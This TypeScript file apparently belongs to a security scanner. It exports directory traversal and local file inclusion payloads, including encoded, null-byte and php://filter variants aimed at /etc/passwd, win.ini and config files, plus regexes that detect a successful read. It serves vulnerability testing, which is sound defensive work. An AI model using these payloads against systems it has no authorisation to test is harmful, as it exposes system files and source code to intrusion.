/** Directory traversal / LFI payloads */
export const TRAVERSAL_PAYLOADS = [
  // Unix — /etc/passwd (most common, works on Linux/macOS)
  '../../../etc/passwd',
  '..\\..\\..\\etc\\passwd',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  // Null byte bypass (PHP < 5.3.4, some other languages)
  '../../../etc/passwd%00',
  '../../../etc/passwd%00.jpg',
  '../../../etc/passwd%00.html',
  // Deeper traversal (for chrooted/nested deployments)
  '../../../../../etc/passwd',
  '../../../../../../etc/passwd',
  // Windows paths
  '..\\..\\..\\windows\\win.ini',
  '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
  // PHP wrappers (LFI → source code disclosure)
  'php://filter/convert.base64-encode/resource=index',
  'php://filter/convert.base64-encode/resource=../config',
  // Absolute paths (bypass weak sanitization)
  '/etc/passwd',
  'C:\\windows\\win.ini',
];

/** Patterns indicating directory traversal / LFI success */
export const TRAVERSAL_SUCCESS_PATTERNS = [
  /root:.*?:0:0/,              // /etc/passwd format
  /\[boot loader\]/i,          // Windows win.ini
  /\[extensions\]/i,           // Windows win.ini
  /\[fonts\]/i,                // Windows win.ini
  /localhost/,                  // Windows hosts file
  // PHP wrapper base64 output (starts with PD for <?php)
  /^[A-Za-z0-9+/]{40,}={0,2}$/m,
];
